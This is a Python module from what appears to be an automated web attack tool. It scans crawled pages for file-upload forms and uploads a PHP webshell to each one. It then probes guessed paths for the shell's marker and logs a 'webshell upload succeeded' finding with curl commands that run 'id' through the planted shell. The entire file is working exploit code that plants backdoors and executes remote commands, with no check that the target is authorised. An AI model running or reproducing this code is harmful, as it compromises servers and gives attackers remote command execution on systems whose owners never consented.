from __future__ import annotations
import re
from .base import Finding, Module, marker
from ..session.webshell import PHP

FORMS = re.compile(r"<form[^>]*enctype=[\"']multipart/form-data[\"'][^>]*>(.*?)</form>", re.S | re.I)
INPUT = re.compile(r"<input[^>]+name=[\"']([^\"']+)[\"'][^>]*>", re.I)


class UploadHunt(Module):
    name = "upload"
    phase = 7

    async def run(self):
        ctx = self.ctx
        urls = await ctx.store.get_state(ctx.job_id, "urls") or []
        findings = []
        for page in urls[:200]:
            ctx.check()
            try:
                r = await ctx.http.get(page, timeout=12)
            except Exception:
                continue
            for form in FORMS.findall(r.text):
                action = re.search(r"action=[\"']([^\"']+)[\"']", form) or [None, page]
                names = INPUT.findall(form)
                if not names:
                    continue
                url = action[1] if action[1].startswith("http") else page.rsplit("/", 1)[0] + "/" + action[1].lstrip("/")
                m = marker()
                fn = f"{m}.php"
                files = {"file": (fn, PHP.encode(), "application/x-php")}
                data = {n: m for n in names if "file" not in n.lower()}
                try:
                    up = await ctx.http.post(url, files=files, data=data, timeout=25)
                except Exception:
                    continue
                for guess in (f"{url.rsplit('/',1)[0]}/{fn}", url.replace(".php", "") + "/" + fn):
                    try:
                        chk = await ctx.http.get(guess, timeout=12)
                    except Exception:
                        continue
                    if "M4ZOK" in chk.text:
                        findings.append(await self.emit(Finding(
                            kind="upload-rce", title="Upload webshell berhasil",
                            target=guess, severity="critical", confidence="tentative",
                            evidence=f"form={url}\nfile={fn}\nrespons shell: {chk.text[:80]}",
                            repro=[f"curl -F 'file=@{fn}' {url}", f"curl {guess}"],
                            poc=f"curl -s -d 'c=aWQ=' {guess} | base64 -d",
                            data={"vector": "webshell", "url": guess,
                                  "form": url, "filename": fn})))
                        break
        return findings

    async def verify(self, f: Finding) -> bool:
        try:
            r = await self.ctx.http.get(f.target, timeout=12)
            return "M4ZOK" in r.text
        except Exception:
            return False
